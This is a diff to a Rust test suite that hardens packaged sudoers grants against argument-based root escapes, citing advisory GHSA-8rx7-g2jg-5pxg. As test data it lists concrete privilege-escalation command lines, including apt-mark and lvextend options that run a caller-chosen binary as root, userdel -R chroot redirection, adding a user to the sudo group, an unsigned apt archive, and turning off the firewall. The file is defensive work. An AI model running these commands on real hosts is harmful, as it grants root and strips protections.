@@ -56,6 +56,8 @@ fn load_grants() -> Vec<Grant> {
 ///   canonicalisation — this is the rule that broke apt.
 /// * A trailing `*` matches all remaining arguments. A grant with no argument
 ///   tokens at all permits any arguments.
+/// * A single `""` argument permits no arguments at all (`sudoers(5)`; sudo-rs
+///   0.2.13 agrees).
 fn grant_allows(grant: &Grant, argv: &[String]) -> bool {
     let Some((grant_cmd, grant_args)) = grant.tokens.split_first() else {
         return false;
@@ -71,6 +73,9 @@ fn grant_allows(grant: &Grant, argv: &[String]) -> bool {
     // A bare command grant ("/usr/bin/sh") allows any arguments.
     if grant_args.is_empty() {
         return true;
+    }
+    if grant_args == [r#""""#] {
+        return actual_args.is_empty();
     }
 
     let mut actual = actual_args.iter();
@@ -164,81 +169,48 @@ fn matcher_rejects_a_bare_binary_name_against_an_absolute_argument_token() {
     );
 }
 
-/// Every grant that still permits any arguments, with the reason it does.
+#[test]
+fn matcher_reads_empty_quotes_as_no_arguments() {
+    // `aa-status ""` is granted with no arguments at all. sudo 1.9.15 and
+    // sudo-rs 0.2.13 both admit `aa-status` and refuse `aa-status --json`
+    // against that line; a matcher that read `""` as a literal token, or as
+    // "anything", would make the grant look wider or narrower than it is.
+    let grant = Grant {
+        tokens: vec!["/usr/sbin/aa-status".to_string(), r#""""#.to_string()],
+    };
+    assert!(grant_allows(&grant, &["aa-status".to_string()]));
+    assert!(!grant_allows(
+        &grant,
+        &["aa-status".to_string(), "--json".to_string()]
+    ));
+}
+
+/// No grant may permit arbitrary arguments.
 ///
 /// A grant with no argument tokens matches whatever sudo is handed after the
 /// command, so `NOPASSWD: /usr/bin/systemctl` authorised `systemctl link
 /// /path/evil.service` as surely as `systemctl restart nginx`. Sixteen
-/// families were narrowed to the argv the catalogue actually builds, in two
-/// passes: first the documented root-shell primitives, then every remaining
-/// binary that can run an arbitrary command as root (certbot through its
-/// hooks, fail2ban-client through a jail action, snap because snaps install
-/// and run as root, rpm-ostree through rpm scriptlets).
+/// families were narrowed in two passes, and fifteen more were left bare on the
+/// reading that their first argument was the parameter, so there was nothing
+/// to anchor a grant on. That reading was wrong for all fifteen
+/// (GHSA-8rx7-g2jg-5pxg): `apt-mark` takes `-o Dir::Bin::dpkg=<path>` after the
+/// subcommand and runs it as root, `lvextend --config` names the `fsadm`
+/// executable `-r` runs, and the shadow tools honour `-R <chroot>` even after
+/// `--`. Each one now has an exact argv, a fixed prefix ending in `--` for a
+/// tool that honours it, or a verb of `/usr/lib/sysknife/action-steps`, which
+/// validates the whole argument list.
 ///
-/// What is left is the set whose FIRST argument is the parameter itself, so
-/// there is no fixed leading token to anchor a grant on, and none of them can
-/// spawn a shell or execute a caller-supplied command.
-///
-/// The catalogue records one SAMPLE argv per action, so a fixed subcommand and
-/// a parameter value are indistinguishable from it: `groupadd developers`
-/// would narrow to the literal string `developers`. That is why this list is
-/// written out instead of computed. What is enforced is that it cannot grow by
-/// accident and cannot go stale.
-const BARE_BY_DESIGN: &[(&str, &str)] = &[
-    (
-        "/usr/bin/add-apt-repository",
-        "the repository spec is the first argument",
-    ),
-    (
-        "/usr/bin/apt-mark",
-        "hold/unhold plus package names, no fixed leading token",
-    ),
-    (
-        "/usr/bin/canonical-livepatch",
-        "subcommand varies; Ubuntu Pro surface",
-    ),
-    (
-        "/usr/bin/chage",
-        "the aging flag is the first argument and varies",
-    ),
-    ("/usr/bin/do-release-upgrade", "flags only, no subcommand"),
-    (
-        "/usr/bin/gpasswd",
-        "the flag and the user are both parameters",
-    ),
-    (
-        "/usr/sbin/aa-complain",
-        "the profile name is the only argument",
-    ),
-    (
-        "/usr/sbin/aa-enforce",
-        "the profile name is the only argument",
-    ),
-    ("/usr/sbin/aa-status", "flags only"),
-    ("/usr/sbin/groupadd", "the group name is the only argument"),
-    ("/usr/sbin/groupdel", "the group name is the only argument"),
-    ("/usr/sbin/lvcreate", "sizing flags vary by request"),
-    ("/usr/sbin/lvextend", "sizing flags vary by request"),
-    (
-        "/usr/sbin/ufw",
-        "eight actions with no shared leading token",
-    ),
-    ("/usr/sbin/userdel", "the username is the only argument"),
-];
-
-/// The direction the original check never looked in.
-///
-/// `every_sudo_action_is_authorised_by_a_packaged_grant` asks whether each
-/// action has a grant. It cannot notice a grant far wider than any action
-/// needs, which is how thirty-one commands came to be authorised with no
-/// argument constraint at all, several of them documented root-shell
-/// primitives. Narrowing them was manual; keeping them narrow is this.
+/// The original check kept a list of bare grants with a reason for each. The
+/// list is empty now, and an empty allowlist is a place for the next one to
+/// land quietly, so the rule is absolute.
 #[test]
-fn no_new_grant_may_permit_arbitrary_arguments() {
+fn no_grant_permits_arbitrary_arguments() {
     let grants = load_grants();
+    let with_arguments = grants.iter().filter(|g| g.tokens.len() > 1).count();
     assert!(
-        !grants.is_empty(),
-        "parsed zero grants — the sudoers parser or file layout changed"
+        with_arguments > 50,
+        "only {with_arguments} grants carry argument tokens; the parser stopped \
+         seeing them, which would make this check pass over nothing"
     );
 
     let bare: Vec<String> = grants
@@ -247,48 +219,13 @@ fn no_new_grant_may_permit_arbitrary_arguments() {
         .map(|g| g.tokens[0].clone())
         .collect();
     assert!(
-        !bare.is_empty(),
-        "no bare grants found at all — the parser stopped seeing argument tokens, \
-         which would make this check pass over nothing"
+        bare.is_empty(),
+        "these grants permit ANY arguments:\n  {}\n\
+         Narrow the grant to the argv the action builds (end the fixed part in \
+         `--` where the tool honours it, or use `\"\"` for no arguments), or \
+         route the call through /usr/lib/sysknife/action-steps.",
+        bare.join("\n  ")
     );
-
-    let declared: std::collections::BTreeSet<&str> =
-        BARE_BY_DESIGN.iter().map(|(cmd, _)| *cmd).collect();
-    let found: std::collections::BTreeSet<&str> = bare.iter().map(String::as_str).collect();
-
-    let undeclared: Vec<&&str> = found.difference(&declared).collect();
-    assert!(
-        undeclared.is_empty(),
-        "these grants permit ANY arguments and are not in BARE_BY_DESIGN:\n  {}\n\
-         Narrow the grant to the argv the action builds, or add it there with the \
-         reason it cannot be narrowed.",
-        undeclared
-            .iter()
-            .map(|c| c.to_string())
-            .collect::<Vec<_>>()
-            .join("\n  ")
-    );
-
-    // A stale entry is as bad as a missing one: it makes the list look
-    // considered while describing a grant that no longer exists.
-    let stale: Vec<&&str> = declared.difference(&found).collect();
-    assert!(
-        stale.is_empty(),
-        "BARE_BY_DESIGN names grants that are no longer bare (or no longer exist):\n  {}\n\
-         Remove them, so the list keeps meaning what it says.",
-        stale
-            .iter()
-            .map(|c| c.to_string())
-            .collect::<Vec<_>>()
-            .join("\n  ")
-    );
-
-    for (cmd, reason) in BARE_BY_DESIGN {
-        assert!(
-            !reason.trim().is_empty(),
-            "{cmd} is declared bare with no reason, which is a list entry rather than a decision"
-        );
-    }
 }
 
 /// Every escape GHSA-j9c3-j2qr-65c4 named, run through the matcher as an argv.
@@ -339,6 +276,90 @@ const ROOT_ESCAPES: &[(&str, &str)] = &[
     (
         "/usr/bin/systemctl link /tmp/evil.service",
         "installs a unit file from a path the caller owns",
+    ),
+    // GHSA-8rx7-g2jg-5pxg item 4: the fifteen bare grants. sudo-rs refuses a
+    // wildcard anywhere but the last argument, so each grant is a fixed argv,
+    // a fixed prefix ending in `--` for tools that honour it, or a helper verb.
+    (
+        "/usr/bin/gpasswd --add x sudo",
+        "root-equivalent group membership; the daemon never ran gpasswd through sudo",
+    ),
+    (
+        "/usr/bin/gpasswd -A x sudo",
+        "makes the account administrator of the sudo group",
+    ),
+    (
+        "/usr/sbin/userdel -R /tmp/x y",
+        "redirects userdel's writes into a caller-chosen root",
+    ),
+    (
+        "/usr/sbin/userdel -- -R /tmp/x y",
+        "the same: shadow-utils scans for -R before getopt, so `--` does not stop it",
+    ),
+    (
+        "/usr/sbin/groupadd -o -g 0 rootgrp",
+        "a second gid-0 group, which reads every root-group file",
+    ),
+    (
+        "/usr/sbin/groupdel -R /tmp/x devs",
+        "the shadow-utils chroot flag again",
+    ),
+    (
+        "/usr/bin/chage -R /tmp/x -M 1 alice",
+        "the shadow-utils chroot flag again",
+    ),
+    ("/usr/bin/chage -E 0 root", "expires the root account"),
+    (
+        "/usr/sbin/lvextend --config=global/fsadm_executable=/tmp/x -r -L +1G vg0/root",
+        "`-r` runs the configured fsadm, so this runs /tmp/x as root",
+    ),
+    (
+        "/usr/sbin/lvcreate --config=global/thin_check_executable=/tmp/x --type thin-pool -L 1G vg0",
+        "runs a caller-chosen thin_check binary as root",
+    ),
+    (
+        "/usr/bin/apt-mark -o Dir::Bin::dpkg=/tmp/x hold bash",
+        "`hold` runs the configured dpkg, so this runs /tmp/x as root",
+    ),
+    (
+        "/usr/bin/apt-mark hold bash -o Dir::Bin::dpkg=/tmp/x",
+        "the same, with the option after the subcommand, which apt also parses",
+    ),
+    (
+        "/usr/bin/add-apt-repository ppa:attacker/x",
+        "the positional form, which also takes a raw sources.list line",
+    ),
+    (
+        "/usr/bin/add-apt-repository -y deb [trusted=yes] http://203.0.113.7/ x main",
+        "an unsigned third-party archive the next install trusts",
+    ),
+    (
+        "/usr/bin/add-apt-repository -y -U http://203.0.113.7/",
+        "an arbitrary archive URI",
+    ),
+    (
+        "/usr/sbin/ufw default allow incoming",
+        "opens every port without any of the eight ufw actions",
+    ),
+    (
+        "/usr/sbin/ufw logging off",
+        "silences the firewall's own record",
+    ),
+    (
+        "/usr/sbin/aa-complain -d /tmp/x nginx",
+        "loads AppArmor profiles from a directory the caller owns",
+    ),
+    (
+        "/usr/sbin/aa-enforce -d /tmp/x nginx",
+        "the same through the enforce verb",
+    ),
+    (
+        "/usr/bin/canonical-livepatch disable",
+        "turns off live kernel patching",
+    ),
+    (
+        "/usr/bin/do-release-upgrade -d",
+        "upgrades the host to an unreleased development series",
     ),
     // GHSA-8rx7-g2jg-5pxg item 5: `kill -s *` admitted every target.
     (
@@ -417,6 +438,31 @@ fn the_root_shell_primitives_have_no_direct_grant() {
         (
             "/usr/bin/kill",
             "`-s KILL -1` signals every process; sudoers cannot refuse a target",
+        ),
+        (
+            "/usr/bin/gpasswd",
+            "`--add <user> sudo` is root-equivalent membership",
+        ),
+        (
+            "/usr/sbin/userdel",
+            "`-R <dir>` is honoured even after `--`",
+        ),
+        (
+            "/usr/sbin/groupadd",
+            "`-o -g 0` creates a second root group",
+        ),
+        (
+            "/usr/sbin/groupdel",
+            "`-R <dir>` is honoured even after `--`",
+        ),
+        ("/usr/bin/chage", "`-R <dir>` is honoured even after `--`"),
+        (
+            "/usr/sbin/lvextend",
+            "`--config` names the executable `-r` runs as root",
+        ),
+        (
+            "/usr/sbin/lvcreate",
+            "`--config` names executables LVM runs as root",
         ),
     ] {
         let matching: Vec<&Grant> = grants.iter().filter(|g| g.tokens[0] == cmd).collect();
